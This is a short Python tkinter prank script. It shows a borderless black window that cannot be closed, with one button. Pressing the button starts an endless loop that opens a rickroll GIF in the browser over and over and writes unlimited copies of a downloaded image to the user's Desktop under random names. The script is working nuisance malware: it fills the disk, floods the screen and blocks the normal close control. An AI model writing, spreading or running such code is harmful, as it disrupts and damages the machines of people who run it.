from tkinter import *
import time
import requests
import os
import random
import webbrowser
import getpass
pas = getpass.getuser()
desktop = r'C:\Users\%s\Desktop\ ' % pas
def close():
	pass
def kill():
	img = requests.get('https://i.postimg.cc/cJsdhXMf/12.png').content
	while True:
		webbrowser.open('https://media.tenor.com/x8v1oNUOmg4AAAAd/rickroll-roll.gif')
		name = str(random.randint(1, 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000))
		with open(desktop + name + ".png", 'wb') as file:
			file.write(img)
#while True:
tk = Tk()
tk.protocol('WM_DELETE_WINDOW', close)
#https://media.tenor.com/x8v1oNUOmg4AAAAd/rickroll-roll.gif
#https://i.postimg.cc/cJsdhXMf/12.png
tk.geometry('300x300')
tk.overrideredirect(True)
tk.config(bg='black')
btn = Button(tk, text='фурри топ', bg='black', fg='red', font=('Consolas', 20), command=kill)
btn.place(x=50, y=100)
tk.mainloop()
